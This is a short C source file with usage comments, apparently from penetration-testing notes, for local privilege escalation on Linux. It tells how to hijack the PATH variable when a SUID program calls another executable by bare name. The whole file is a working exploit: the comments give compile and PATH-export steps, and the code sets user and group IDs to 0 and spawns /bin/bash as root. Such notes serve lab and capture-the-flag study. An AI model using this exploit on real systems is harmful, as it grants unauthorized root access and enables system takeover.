// gcc exploit.c -o exploit
// export PATH=/$PWD:$PATH

//      You are creating a malicious executable and placing its
//      directory ahead of the legitimate executable's directory via the PATH variable

// Use this code when an SUID executable calls an executable directly (use strings to identify this)
// compile the code, add the current directory to PATH, and call the executable from the same directory

int main(void) {
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}

